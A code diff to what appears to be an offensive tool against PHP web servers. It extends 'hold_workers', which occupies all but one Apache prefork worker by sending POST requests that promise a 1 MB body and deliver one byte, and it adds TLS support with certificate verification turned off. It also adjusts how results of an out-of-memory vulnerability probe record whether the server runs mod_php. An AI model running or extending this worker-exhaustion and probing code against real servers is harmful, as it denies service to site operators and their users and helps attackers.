@@ -228,6 +228,7 @@ class DiscoverResult:
     oom_status_code: Optional[int] = None
     oom_body_snippet: Optional[str] = None
     oom_sapi_is_mod_php: Optional[bool] = None
+    sapi_inferred: bool = False
     discovered_pages: List[str] = field(default_factory=list)
     discovered_params: Dict[str, List[str]] = field(default_factory=dict)
     crawled_pages: List[str] = field(default_factory=list)
@@ -1217,6 +1218,7 @@ def hold_workers(
     port: int,
     workers: int,
     timeout: float = 60.0,
+    use_tls: bool = False,
 ) -> List[socket.socket]:
     """Occupy all but one prefork child with incomplete POST bodies.
 
@@ -1229,6 +1231,12 @@ def hold_workers(
     for _ in range(n):
         try:
             s = socket.create_connection((host, port), timeout=5)
+            if use_tls:
+                import ssl
+                ctx = ssl.create_default_context()
+                ctx.check_hostname = False
+                ctx.verify_mode = ssl.CERT_NONE
+                s = ctx.wrap_socket(s, server_hostname=host)
             s.sendall(b"POST /index.php HTTP/1.1\r\nHost: " + host.encode() + b"\r\n"
                       b"Content-Type: application/x-www-form-urlencoded\r\n"
                       b"Content-Length: 1048576\r\n\r\nx")
@@ -1458,11 +1466,17 @@ def run_discovery(
         result.oom_vulnerable = oom["triggered"]
         result.oom_status_code = oom["status"]
         result.oom_body_snippet = oom["body_snippet"]
-        result.oom_sapi_is_mod_php = True
         if sapi_inferred_mod_php:
+            # Inferred — may be Apache+FPM (ProxyPassMatch), not true mod_php
+            result.oom_sapi_is_mod_php = True
+            result.sapi_inferred = True
             profile.sapi = "mod_php"
             profile.sapi_source = "server-header-inferred"
             profile.sapi_verified = False
+            _log("WARNING: mod_php inferred from Server header — "
+                 "could be Apache+FPM (ProxyPassMatch). Use --sapi mod_php to confirm.")
+        else:
+            result.oom_sapi_is_mod_php = True
         if oom["evidence_ref"]:
             result.evidence_refs.append(oom["evidence_ref"])
         if oom["triggered"]:
